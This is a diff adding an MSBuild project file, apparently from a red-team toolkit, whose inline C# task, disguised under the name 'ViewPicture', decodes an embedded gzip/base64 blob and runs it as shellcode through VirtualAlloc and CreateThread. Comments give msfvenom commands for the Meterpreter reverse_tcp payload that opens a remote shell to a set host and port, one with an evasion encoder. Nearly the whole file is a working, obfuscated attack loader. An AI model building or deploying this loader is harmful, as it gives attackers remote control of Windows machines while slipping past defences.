@@ -1,0 +1,112 @@
+<!--
+# -------------------------------------------------------------------------------
+# Copyright: (c) BLS OPS LLC.
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, version 3.
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+# GNU General Public License for more details.
+# You should have received a copy of the GNU General Public License
+# along with this program. If not, see <https://www.gnu.org/licenses/>.
+# -------------------------------------------------------------------------------
+-->
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+	<Target Name="Hello">
+		<FragmentExample />
+		<ViewPicture />
+	</Target>
+  
+	<UsingTask TaskName="FragmentExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+		<ParameterGroup/>
+		<Task>
+			<Using Namespace="System" />  
+			<Code Type="Fragment" Language="cs">
+			<![CDATA[
+				Console.WriteLine("Hello");
+			]]>
+			</Code>
+		</Task>
+	</UsingTask>
+	
+	<UsingTask TaskName="ViewPicture" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+		<ParameterGroup/>
+		<Task>
+			<Using Namespace="System" />
+			<Using Namespace="System.Reflection" />
+			<Code Type="Class" Language="cs">
+				<![CDATA[
+				
+				using System;
+				using System.IO;
+				using Microsoft.Build.Framework;
+				using Microsoft.Build.Utilities;
+				using System.IO.Compression;
+				using System.Runtime.InteropServices;
+				using System.Threading;
+				
+				public class ViewPicture :  Task, ITask
+				{
+					public override bool Execute()
+					{
+						IntPtr processHandle = IntPtr.Zero;
+						// CHANGE SHELLCODE HERE
+						// msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.25 LPORT=54321 -f raw 2>/dev/null | gzip | base64 -w 0
+						// msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.25 LPORT=54321 --encoder x86/xor_dynamic -f raw 2>/dev/null | gzip | base64 -w 0
+						String MyPicture_B64 = "H4sIADuX2FsAA/vzoomBgSGh86nhgZTuAIPuIJ7uIJHuIg3+7V5qhv/X2CTWMOkoHDzPy3j80aeg8O4ggW4vm24fwYrHHowXA7sjFRgvd3tKPLby7DbpZrwG1ABWavGg9Btz7Q/rWpXSJxHdESqMl9O6eby7I2SAqlm6GS90uqioREcnRkYF/n8QHx/VLfS6NzYjL7WEIaM8My8zJMOnXI39/1XD28EgkGEVVrn8/9Xg4CxmIGc3IwPDizNAJ+sbBBYaeVdG5rhl5/u7O1pEhSU7R4UHmpSWZptXljhFmKdXJRnmpwRVuZia+ARV6UalBkd4VziXV5ZmpTEEZIR3zj/2/2rnseAMBqMHLUBrwoPDMl6H6ln/vzotiys+o8GYgaHzQRZLQJZ8WEap27w2kAuCgWp02SSq/19tPVAqktEhzMCQ4fLB9MH/q/6lZ194AV2V5ZDBIAAUZWBwYAjOiFgS/PT/1cnBwZ3PwzMYFBgYgPqFpnU+AukvOd/NzngYaM7TiMPxL7L///9vaGqpZ2aqZ2RkqWdhzLD7w9ZFYVkMwf+vAgCaHYhMowEAAA==";
+
+						byte[] MyPicture_gzip = Convert.FromBase64String(MyPicture_B64);
+						byte[] MyPicture_c = Decompress(MyPicture_gzip);
+						processHandle = open_MyPicture(MyPicture_c);
+						WaitForSingleObject(processHandle, 0xFFFFFFFF);
+						return true;
+					}
+					
+					static byte[] Decompress(byte[] data)
+					{
+						using (var compressedStream = new MemoryStream(data))
+						using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
+						using (var resultStream = new MemoryStream())
+						{
+							zipStream.CopyTo(resultStream);
+							return resultStream.ToArray();
+						}
+					}
+					
+					private static IntPtr open_MyPicture(byte[] my_picture)
+					{
+						UInt32 funcAddr = VirtualAlloc(0, (UInt32)my_picture.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+						Marshal.Copy(my_picture, 0, (IntPtr)(funcAddr), my_picture.Length);
+						IntPtr hThread = IntPtr.Zero;
+						UInt32 threadId = 0;
+						IntPtr pinfo = IntPtr.Zero;
+						hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+						return hThread;
+					}
+					private static UInt32 MEM_COMMIT = 0x1000;
+					private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+					[DllImport("kernel32")]
+					private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+					 UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+					[DllImport("kernel32")]
+					private static extern IntPtr CreateThread(
+						UInt32 lpThreadAttributes,
+						UInt32 dwStackSize,
+						UInt32 lpStartAddress,
+						IntPtr param,
+						UInt32 dwCreationFlags,
+						ref UInt32 lpThreadId
+					);
+					[DllImport("kernel32")]
+					private static extern UInt32 WaitForSingleObject(
+						IntPtr hHandle,
+						UInt32 dwMilliseconds
+					);
+				}
+				
+				]]>
+			</Code>
+		</Task>
+	</UsingTask>
+</Project>
